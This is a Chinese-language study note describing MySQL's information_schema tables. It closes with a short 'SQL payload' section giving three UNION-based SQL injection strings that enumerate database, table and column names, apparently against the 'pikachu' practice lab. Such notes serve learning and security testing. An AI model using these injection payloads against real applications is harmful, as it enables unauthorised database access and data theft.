# MySQL  information_schema

参考：

https://www.cnblogs.com/yachao1120/p/12058836.html

information_schema是一个描述MySQL中所有dbs，tables，columns，privileges等数据的一个数据库，及metadata

- **SCHEMATA**

  提供当前MySQL实例中所有数据库的信息，是show databases的结果取之此表

- **TABLES**

  提数据库中所有的表信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，列数，创建时间等信息show tables from schemaname

- **COLUMNS**

  提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。

- STATISTICS

  提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。

- USER_PRIVILEGES

  给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。

- SCHEMA_PRIVILEGES

  给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。

- TABLE_PRIVILEGES

  给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。

- COLUMN_PRIVILEGES

  给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。

- CHARACTER_SETS

  提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。

- COLLATIONS

  提供了关于各字符集的对照信息。

- COLLATION_CHARACTER_SET_APPLICABILITY

  指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。

- TABLE_CONSTRAINTS

  描述了存在约束的表。以及表的约束类型。

- KEY_COLUMN_USAGE

  描述了具有约束的键列。

- ROUTINES

  提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。

- VIEWS

  给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。

- TRIGGERS

  提供了关于触发程序的信息。必须有super权限才能查看该表

## SQL payload

通过内置函数获取到数据库名

```mysql
' union select user(),database()#
```

获取对应数据库中的表名和行数

```sql
' union select table_name,table_rows from information_schema.tables where table_schema = 'pikachu' #
```

查询对应表名的列名

```sql
' union select table_name,column_name from information_schema.columns where table_name='users'#
```

然后可以同样通过union查询对应的值
